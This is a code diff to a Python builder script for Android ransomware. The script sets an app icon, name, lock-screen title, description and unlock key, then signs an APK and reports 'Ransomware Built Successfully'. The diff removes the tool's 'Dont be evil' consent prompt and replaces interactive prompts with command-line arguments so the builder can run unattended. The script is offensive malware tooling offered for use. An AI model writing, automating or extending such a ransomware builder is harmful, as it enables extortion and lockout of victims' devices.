@@ -2,13 +2,14 @@
 import os, sys, time, fileinput
 from getpass import getpass
 from PIL import Image
-
+import sys
 
 app_icon = ""
 app_name = ""
 alert_title = ""
 alert_desc = ""
 key_pass = ""
+
 
 def writefile(file,old,new):
     while True:
@@ -25,11 +26,8 @@ def writefile(file,old,new):
 def start():
     global app_icon, app_name, alert_title, alert_desc, key_pass
     os.system("clear")
-    ask = input(" Do you agree (y/n): ").lower()
-    if ask in ("yes"): pass
-    else: exit(" Dont be evil !")
     while True:
-        x = input("* SET app_icon (PNG only): ")
+        x =sys.argv[1]
         if os.path.isfile(x):
             if ".png" in x:
                 app_icon = x
@@ -37,25 +35,25 @@ def start():
             else: print(" File not accepted, PNG format only !")
         else: print(" File not found, please fill correctly !")
     while True:
-        x = input("* SET app_name: ")
+        x =sys.argv[2]
         if len(x) != 0:
             app_name = x
             break
         else: continue
     while True:
-        x = input("* SET title: ")
+        x =sys.argv[3]
         if len(x) != 0:
             alert_title = x
             break
         else: continue
     while True:
-        x = input("* SET description: ")
+        x =sys.argv[4]
         if len(x) != 0:
             alert_desc = x
             break
         else: continue
     while True:
-        x = input("* SET unlock key: ")
+        x =sys.argv[5]
         if len(x) != 0:
             key_pass = x
             break
@@ -101,11 +99,10 @@ def start():
         out = app_name.replace(" ","").lower() + ".apk"
         os.system("mv final-aligned-signed.apk "+out)
         print(" Ransomware Built Successfully ")
-    else: print(" Failed to signed APK's")
+    else: print(" Failed to signed APK's ")
 
 if __name__ == "__main__":
     try:
         start()
     except KeyboardInterrupt:
         exit("exiting ...")
-        
